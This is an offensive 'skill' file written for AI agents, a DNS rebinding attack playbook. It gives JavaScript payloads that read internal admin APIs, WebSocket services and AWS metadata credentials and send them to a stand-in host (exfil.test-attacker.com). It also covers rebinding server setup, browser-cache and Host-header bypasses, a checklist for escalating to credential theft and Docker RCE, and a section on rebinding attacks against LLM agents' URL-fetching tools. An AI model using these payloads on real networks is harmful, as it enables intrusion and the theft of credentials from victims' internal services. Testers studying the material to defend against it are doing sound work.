---
name: dns-rebinding-attacks
description: >-
  DNS rebinding attack playbook. Use when testing applications that trust DNS resolution for origin checks, interact with internal services from browser context, or when SSRF is not possible server-side but the target has client-side fetch/XHR to attacker-controlled domains.
---

# SKILL: DNS Rebinding — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert DNS rebinding techniques for bypassing same-origin policy via DNS manipulation. Covers TTL tricks, browser cache bypasses, attack variants (HTTP, WebSocket, TOCTOU), internal service targeting, and tool usage. Base models confuse DNS rebinding with SSRF — this skill clarifies the client-side nature and unique exploit paths.

## 0. RELATED ROUTING

- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) — server-side variant; DNS rebinding is the **client-side** counterpart
- [cors-cross-origin-misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) — when CORS misconfig allows direct cross-origin reads instead

---

## 1. CORE PRINCIPLE

The browser same-origin policy binds `protocol + host + port`. The **host** is resolved via DNS at connection time. If an attacker controls the DNS server for `test-attacker.com`, they can:

1. First resolution → attacker IP (serve malicious JS)
2. Second resolution → internal IP (victim's network)
3. Browser considers both responses same-origin (`test-attacker.com`)
4. Malicious JS reads responses from internal services

```
Victim visits test-attacker.com
        │
        ▼
DNS query: test-attacker.com → 1.2.3.4 (attacker server)
Browser loads malicious JS from 1.2.3.4
        │
        ▼
TTL expires (or forced flush)
        │
        ▼
JS triggers new request to test-attacker.com
DNS query: test-attacker.com → 192.168.1.1 (internal target)
Browser sends request to 192.168.1.1 as "test-attacker.com" origin
        │
        ▼
JS reads response — same-origin policy satisfied
Exfiltrates data to attacker's other endpoint
```

**Key insight**: SOP checks the hostname string, not the resolved IP. DNS can change the IP behind the same hostname.

---

## 2. TTL MANIPULATION

### DNS server configuration

The attacker runs an authoritative DNS server for their domain that alternates responses:

| Query # | Response | TTL |
|---|---|---|
| 1st | Attacker IP (e.g., `1.2.3.4`) | 0 |
| 2nd+ | Target internal IP (e.g., `192.168.1.1`) | 0 |

TTL=0 tells resolvers not to cache the result, forcing re-resolution on next connection.

### Browser DNS cache reality

Browsers maintain their own DNS cache that **ignores low TTLs**:

| Browser | Internal DNS Cache | Bypass Technique |
|---|---|---|
| Chrome | ~60 seconds minimum | Wait 60s; or use multiple subdomains |
| Firefox | ~60 seconds (network.dnsCacheExpiration) | Adjustable in about:config |
| Safari | ~varies | Generally shorter cache |
| Edge (Chromium) | Same as Chrome (~60s) | Same techniques as Chrome |

### Bypass strategies

```
1. Multiple A records technique:
   - Return BOTH attacker IP and target IP in single DNS response
   - Browser tries first IP; if connection fails → falls back to second
   - Block attacker IP after initial page load → forces fallback to internal IP
   
2. Subdomain flooding:
   - Use unique subdomains: a1.rebind.test-attacker.com, a2.rebind.test-attacker.com...
   - Each subdomain gets fresh DNS resolution (no cache hit)
   
3. Service worker flush:
   - Register service worker that intercepts and delays requests
   - By the time fetch executes, DNS cache has expired
```

---

## 3. ATTACK VARIANTS

### 3.1 Classic HTTP Rebinding

Target: internal web services (admin panels, REST APIs)

```javascript
// Served from test-attacker.com (first DNS resolution → attacker IP)
async function exploit() {
    // Wait for DNS cache to expire
    await sleep(65000); // >60s for Chrome
    
    // This request now resolves to internal IP
    const resp = await fetch('http://test-attacker.com:8080/api/admin/users');
    const data = await resp.text();
    
    // Exfiltrate to different attacker endpoint
    navigator.sendBeacon('https://exfil.test-attacker.com/log', data);
}
```

### 3.2 WebSocket Rebinding

WebSocket connections persist after DNS rebinding. Establish WS, then rebind:

```javascript
// After rebinding, WebSocket connects to internal service
const ws = new WebSocket('ws://test-attacker.com:9090/ws');
ws.onopen = () => {
    ws.send('{"action":"dump_config"}');
};
ws.onmessage = (e) => {
    fetch('https://exfil.test-attacker.com/ws-data', {
        method: 'POST',
        body: e.data
    });
};
```

### 3.3 Time-of-Check-to-Time-of-Use (TOCTOU)

Server-side applications that validate DNS at request time but reuse the connection:

```
1. Application receives URL: http://test-attacker.com/callback
2. Server resolves test-attacker.com → 1.2.3.4 (public IP) → passes validation
3. Server opens connection / follows redirect
4. DNS changes: test-attacker.com → 169.254.169.254
5. Connection reuse or redirect hits internal IP
```

This is a hybrid with SSRF — the rebinding happens in the server's resolver.

### 3.4 Multiple A Records (Fastest Variant)

```
DNS response for test-attacker.com:
  A  1.2.3.4       (attacker — serves JS)
  A  192.168.1.1   (target — internal service)
  
1. Browser connects to 1.2.3.4, loads page with JS
2. Attacker firewall blocks further connections from victim to 1.2.3.4
3. JS makes new request to test-attacker.com
4. Browser tries 1.2.3.4 → connection refused
5. Falls back to 192.168.1.1 → still same origin
6. Response readable by JS
```

---

## 4. HIGH-VALUE TARGETS

| Target | Port | Why |
|---|---|---|
| Cloud metadata | `169.254.169.254:80` | AWS/GCP/Azure instance credentials, tokens |
| Docker API | `172.17.0.1:2375` | Container creation, host filesystem mount → RCE |
| Kubernetes API | `10.96.0.1:443/6443` | Pod creation, secret reading |
| Internal admin panels | Various | Router config, NAS, printer, SCADA |
| IoT devices | `192.168.x.x:80/443` | Camera feeds, smart home control |
| Elasticsearch | `*:9200` | Data exfiltration, index manipulation |
| Redis | `*:6379` | Data read, config set for RCE |
| Consul/etcd | `*:8500/2379` | Service discovery, secret storage |

### Cloud metadata specific

```javascript
// AWS metadata via rebinding
fetch('http://test-attacker.com/latest/meta-data/iam/security-credentials/')
    .then(r => r.text())
    .then(role => {
        return fetch(`http://test-attacker.com/latest/meta-data/iam/security-credentials/${role}`);
    })
    .then(r => r.json())
    .then(creds => {
        navigator.sendBeacon('https://exfil.test-attacker.com/', JSON.stringify(creds));
    });
// After rebinding, test-attacker.com resolves to 169.254.169.254
// Browser sends Host: test-attacker.com but IMDSv1 doesn't check Host header
```

**IMDSv2 defense**: requires `X-aws-ec2-metadata-token` header from PUT request. Rebinding cannot easily set custom headers on the initial token request in `no-cors` mode.

---

## 5. TOOLS

| Tool | Purpose | URL |
|---|---|---|
| **Singularity** | Full DNS rebinding attack framework | github.com/nccgroup/singularity |
| **rbndr.us** | Quick rebind DNS service (IP pair in subdomain) | rbndr.us |
| **whonow** | Dynamic DNS rebinding server | github.com/taviso/whonow |
| **dnsrebinder** | Minimal Python DNS server for rebinding | Custom / various repos |

### Singularity quick start

```bash
# Clone and run
git clone https://github.com/nccgroup/singularity
cd singularity
go build -o singularity cmd/singularity-server/main.go

# Start with rebind from attacker IP to target IP
./singularity -DNSRebindStrategy round-robin \
    -ResponseIPAddr 1.2.3.4 \
    -RebindingFn sequential \
    -ResponseReboundIPAddr 192.168.1.1
```

### rbndr.us (zero-setup)

```
Format: <hex-ip1>.<hex-ip2>.rbndr.us
Example: 7f000001.c0a80101.rbndr.us
  → alternates between 127.0.0.1 and 192.168.1.1
  
Convert IP to hex:
  192.168.1.1 → c0.a8.01.01 → c0a80101
  127.0.0.1   → 7f.00.00.01 → 7f000001
```

---

## 6. DNS REBINDING vs. SSRF

| Aspect | DNS Rebinding | SSRF |
|---|---|---|
| Execution context | Client-side (browser) | Server-side |
| Origin bypass | Same-origin policy | Network access controls |
| Attacker controls | DNS resolution | URL/request sent by server |
| Requires | Victim visits attacker page | Vulnerable server-side fetch |
| Internal access via | Browser on victim's network | Server's network position |
| Credential inclusion | Browser cookies auto-included | No user credentials |
| Protocol support | HTTP/WS (browser-limited) | Any protocol (gopher, file, etc.) |

**Critical difference**: DNS rebinding leverages the **victim's browser** as the pivot point, so it accesses services visible from the **victim's network**, with the **victim's cookies/credentials**.

---

## 7. DEFENSES AND DEFENSE BYPASS

### Common defenses

| Defense | How it works |
|---|---|
| DNS pinning | Browser/resolver caches DNS and refuses re-resolution |
| Host header validation | Server rejects requests with unexpected Host header |
| Network segmentation | Internal services not reachable from browser network |
| Private network access (PNA) | Chrome's proposal: preflight for requests to private IPs |
| Authentication on internal services | Internal services require auth, not just network access |

### Defense bypass techniques

```
DNS pinning bypass:
├── Multiple A records → connection failure forces fallback
├── Subdomain per request → no cache hit
├── Wait for cache expiry (Chrome: 60s)
└── Rebind via CNAME chain (harder to pin)

Host header validation bypass:
├── Internal service may not check Host header at all
├── Host: test-attacker.com accepted by default configs
├── IP-based vhosts don't check Host
└── Wildcard vhost configurations

Private Network Access (PNA) bypass:
├── PNA only in Chrome (as of 2024), partial enforcement
├── WebSocket connections may not trigger preflight
├── HTTPS → HTTP downgrade scenarios
└── Non-browser clients unaffected
```

---

## 8. DECISION TREE

```
Want to access internal services from victim's browser?
│
├── Can you get victim to visit your page?
│   ├── YES → DNS rebinding is viable
│   │   │
│   │   ├── What is the target?
│   │   │   ├── HTTP service → Classic rebinding (Section 3.1)
│   │   │   ├── WebSocket service → WS rebinding (Section 3.2)
│   │   │   └── Cloud metadata → Metadata exfil (Section 4)
│   │   │
│   │   ├── Browser cache concern?
│   │   │   ├── Chrome → Wait 60s or use multiple subdomains
│   │   │   ├── Firefox → Wait 60s or adjust dnsCacheExpiration
│   │   │   └── Use multiple A records technique for instant rebind
│   │   │
│   │   ├── Target checks Host header?
│   │   │   ├── YES → Rebinding alone won't work
│   │   │   │   └── Check for SSRF instead (../ssrf-server-side-request-forgery/)
│   │   │   └── NO → Proceed with rebinding
│   │   │
│   │   └── Need credentials?
│   │       ├── Browser auto-sends cookies → works if same-site allows
│   │       └── Custom auth header needed → limited (no-cors won't send custom headers)
│   │
│   └── NO → DNS rebinding not applicable
│       └── Consider SSRF if server-side fetch exists
│
└── Is this server-side DNS validation bypass? (TOCTOU)
    ├── YES → Hybrid approach (Section 3.3)
    │   └── SSRF with DNS rebinding for IP validation bypass
    └── NO → Review ../ssrf-server-side-request-forgery/ instead
```

---

## 9. 2026 EMERGING TECHNIQUES

### 9.1 DNS Rebinding Against AI Agent URL Fetching (2026)

LLM agents that fetch attacker-supplied URLs (web browsing tools, RAG ingestion, link preview) inherit the same resolution-vs-connection gap that web servers suffer — but with no browser DNS cache to slow the rebind.

**Attack chain**:

```text
1. Attacker gives the agent a URL: http://make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms/
2. Agent resolves the hostname -> 1.2.3.4 (public, passes any allowlist/SSRF check).
   TTL=0 / round-robin.
3. Agent opens the HTTP connection; second DNS lookup returns 169.254.169.254
   (AWS metadata) or 127.0.0.1 (local agent services).
4. The request now hits the internal target, but the agent believes it is still
   talking to the original allowlisted host -> metadata/credentials returned
   into the agent context, exfiltrable via the model's reply.
```

The agent is vulnerable for the identical reason a web server is: **DNS resolution and TCP connection are not bound to the same IP**. The validation step (resolve -> check IP against allowlist) and the connection step (resolve again -> connect) use independent lookups.

**rbndr-style hostname construction (1u.ms)**:

```text
# Format: make-<publicIP>-rebind-<internalIP>-rr.1u.ms/
# Round-robins between the two IPs with TTL=0, no infra required.

# Public IP 1.2.3.4  +  AWS metadata 169.254.169.254:
make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms/

# Public IP 1.2.3.4  +  localhost 127.0.0.1:
make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms/

# Classic rbndr.us (hex-IP pair):
#   7f000001.c0a80101.rbndr.us  ->  127.0.0.1 / 192.168.1.1
# Convert IP to hex: 169.254.169.254 -> a9fea9fe
#   01020304.a9fea9fe.rbndr.us  ->  1.2.3.4 / 169.254.169.254
```

**Tools**: **1u.ms** (rbndr-style hostnames, zero setup); **NCC Group Singularity** (full-featured rebinding server with configurable strategies: round-robin, sequential, multiple-A).

(cross-link ../ai-llm-attack-surface/SKILL.md and ../ssrf-server-side-request-forgery/SKILL.md)

### 9.2 2026 Defense — DNS Pinning

DNS pinning resolves the hostname once, locks the IP for the duration of validation, and reuses that exact IP for the connection — the HTTP library must not re-resolve. Despite being the canonical fix, in 2026 most HTTP client libraries and agent frameworks still do **not** pin:

```text
# Pseudocode - correct pinning (rare in practice):
ip = resolve(host)
if not is_allowed(ip): abort
sock = connect(ip)                 # connect to the PINNED ip, not resolve(host) again
sock.send(f"Host: {host}\r\n...")
```

Common libraries (`requests`, `httpx`, `urllib`, LangChain's `requests`-based tools) resolve fresh on every connection — pinning requires a custom HTTPAdapter/transport that caches the resolved address. Test whether the target agent framework pins by observing two connections to the same hostname landing on different IPs.

### 9.3 Cloud-Environment DNS Rebinding (2026)

| Cloud component | Rebinding-relevant behavior |
|---|---|
| AWS ALB | ALB DNS returns multiple IPs; an internal ALB's DNS name resolves to private IPs — a rebinding hostname that CNAMEs into the internal ALB reaches it from an agent that resolved the public name first |
| Cloudflare 1.1.1.1 DoH | DoH centralizes resolution; rebinding TTL=0 is honored more strictly (less ISP caching), making the second-resolution -> internal IP transition faster and more reliable |
| Split-horizon DNS | Internal resolver returns 10.x for internal names; an agent using the external resolver gets the public IP at validation but, if it later uses the internal resolver (VPN/agent mesh), hits the private IP — a rebinding-like desync |

### 9.4 Browser DNS Cache Behavior (2026)

| Browser | 2026 cache behavior | Rebinding impact |
|---|---|---|
| Chrome | async DNS resolver caches per-host for ~60s (min TTL), but `connections` API and fetch keepalive can bypass | Multiple-A-record fallback still reliable; service-worker-delayed fetches win the 60s window |
| Firefox | TRR (Trusted Recursive Resolver) via DoH; `network.trr.mode` controls fallback | DoH removes ISP-cache interference -> TTL=0 honored -> rebind window tighter and more predictable |
| DoH (any browser) | Resolution path no longer hits OS resolver cache | Attacker's authoritative TTL=0 propagates with no intermediate caching -> second lookup reliably returns the internal IP |

DoH makes the rebind **timing more controllable** because there is no unpredictable ISP/OS caching layer between the attacker's authoritative server and the client.

### 9.5 DNS Rebinding + WebSocket (2026)

Once a WebSocket handshake completes, the long-lived TCP connection is immune to subsequent DNS changes — but the **Upgrade request itself** is a normal HTTP request and fully rebindable:

```text
1. Browser/agent opens ws://rebind.attacker.com/ws  ->  resolves attacker IP, sends Upgrade.
2. If the agent validates the host on the Upgrade response but the Upgrade is
   proxied/redirected, the actual TCP connect can rebind to an internal WS service
   (e.g., 172.17.0.1:2375 Docker, internal admin WS).
3. After upgrade, the agent reads frames from the internal service as if same-origin.
```

The persistent connection then bypasses per-request DNS checks entirely — the rebind only needs to succeed once, at handshake time.

### 9.6 2026 Rebinding Checklist

```
□ If agent fetches URLs: does it pin the resolved IP for the connection? (likely no)
□ Test 1u.ms / Singularity hostnames against agent URL-fetch tools
□ Validate: first resolution public, second resolution internal, response readable
□ Check whether HTTP client uses custom adapter (pinned) or default (re-resolves)
□ If target uses DoH: rebind window is tighter - no need to wait out ISP cache
□ Test WebSocket Upgrade requests for rebinding (handshake-time only)
□ Cloud ALB/internal DNS: can a rebinding hostname reach internal-only DNS names?
□ Confirm exfil: internal response content returned into agent/browser context
```

---

## 10. REAL-WORLD EXPLOITATION CHECKLIST

```
□ Set up DNS rebinding infrastructure (Singularity / rbndr.us / custom)
□ Identify target internal services (port scan from victim context if possible)
□ Determine browser DNS cache duration for target browser
□ Choose rebinding variant (classic / multi-A / subdomain flood)
□ Test with benign internal endpoint first (e.g., / on router)
□ Verify same-origin read works after rebind
□ Escalate: cloud metadata → creds, Docker API → RCE, admin panels → config
□ Document: test-attacker.com DNS config, JS payload, rebind timing, exfil data
```
